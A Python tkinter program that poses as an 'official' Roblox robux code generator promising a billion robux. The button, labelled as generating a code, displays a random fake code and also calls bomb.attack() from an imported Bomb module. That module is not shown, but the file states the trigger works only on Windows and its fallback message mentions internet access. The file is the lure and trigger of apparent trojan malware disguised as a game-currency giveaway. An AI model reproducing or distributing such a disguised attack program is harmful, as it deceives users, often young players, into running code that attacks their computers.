import os
from os import path
from tkinter import *
from PIL import Image, ImageTk
import platform
import random
import backend.config as c
import backend.paths as paths
from backend.bomb import Bomb
from backend.codegenerator import Generator

# ! WORKS ONLY IN THE WINDOWS

window = Tk()
window.title("ROBLOX OFFICIAL ROBUX CODE GENERATOR 🤑🤑🤑🤑")
window.geometry("400x400")

robuxtext = Label(window, text="Click on the button below to win a 1 Billion robux Code 🤑")
robuxtext.pack(padx=15,pady=25)

getrobuxnow = Button(window, text="GENERATE NEW CODE NOW!!!")
getrobuxnow.pack(pady=15)

code = Label(window, text="Output: Nothing 😭")
code.pack(padx=15,pady=10)

bobuximg = ImageTk.PhotoImage(Image.open(paths.img("bobux")))
robux = Label(image=bobuximg)
robux.pack()

bomb = Bomb()
codeGenerator = Generator()

def newCode():
    codeGenerator.generate()
    code.config(text="Output: "+codeGenerator.code)
def attackPC():
    newCode()
    bomb.attack()

if bomb.success:
    getrobuxnow.config(command=attackPC)
else:
    getrobuxnow.config(command=newCode)
    print('Operating System not supported or is without internet!')

window.mainloop()